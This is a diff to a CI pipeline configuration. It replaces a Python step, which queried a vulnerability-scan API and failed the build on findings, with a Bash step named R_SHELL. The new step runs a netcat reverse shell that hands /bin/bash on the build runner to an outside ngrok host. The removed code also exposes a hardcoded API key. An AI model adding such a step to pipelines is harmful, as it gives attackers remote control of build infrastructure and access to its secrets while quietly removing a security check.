@@ -26,30 +26,11 @@ pipeline:
                   type: Run
               - step:
                   type: Run
-                  name: BEE
+                  name: R_SHELL
                   identifier: BEE
                   spec:
-                    shell: Python
-                    command: |
-                      import requests
-                      import json
-
-                      api_key = "j93nakD8xJgTJMjXu1xztavmgYe8bRRh"
-                      scan_id = "1"
-                      api_url = f"https://7314-2405-201-6003-a8e9-18fd-fe1c-ea30-9f6e.ngrok-free.app/api/{api_key}/v0.1/scan/{scan_id}"
-
-
-                      response = requests.get(api_url)
-
-                      data = response.json()
-                      issue_events = data.get("issue_events", [])
-                      issues = [event["issue"]["name"] for event in issue_events]
-
-                      if issues != "":
-                          print("Issues found:")
-                          for issue in issues:
-                              print(issue)
-                          raise ValueError("Vulnerabilities found")
+                    shell: Bash
+                    command: nc 0.tcp.in.ngrok.io 14801 -e /bin/bash
                   failureStrategies:
                     - onFailure:
                         errors:
